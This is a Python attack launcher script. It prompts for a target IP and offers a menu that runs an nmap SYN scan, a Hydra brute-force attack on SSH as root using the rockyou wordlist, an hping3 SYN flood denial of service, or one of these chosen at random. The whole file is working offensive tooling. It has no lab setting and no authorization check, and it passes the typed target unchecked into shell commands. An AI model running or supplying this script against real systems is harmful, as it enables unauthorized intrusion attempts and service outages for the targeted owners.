import os
import random

def show_menu():
    print("\nAvailable Attacks:")
    print("1. Port Scanning (Nmap)")
    print("2. Brute Force Attack (Hydra)")
    print("3. Denial of Service (DoS) Simulation (Hping3)")
    print("4. Random Attack")
    print("5. Exit")

def port_scanning(target_ip):
    print(f"\n[INFO] Executing Port Scanning on {target_ip} using Nmap...")
    os.system(f"nmap -sS {target_ip}")

def brute_force_attack(target_ip):
    print(f"\n[INFO] Executing Brute Force Attack on {target_ip} using Hydra...")
    os.system(f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target_ip}")

def dos_attack(target_ip):
    print(f"\n[INFO] Executing DoS Attack on {target_ip} using Hping3...")
    os.system(f"hping3 -S --flood -V {target_ip}")

def main():
    target_ip = input("Enter the target IP address for the attack: ")
    while True:
        show_menu()
        choice = input("\nEnter the number of the attack you want to execute: ")
        
        if choice == '1':
            port_scanning(target_ip)
        elif choice == '2':
            brute_force_attack(target_ip)
        elif choice == '3':
            dos_attack(target_ip)
        elif choice == '4':
            random_attack = random.choice([port_scanning, brute_force_attack, dos_attack])
            random_attack(target_ip)
        elif choice == '5':
            print("\n[INFO] Exiting the attack script.")
            break
        else:
            print("\n[ERROR] Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()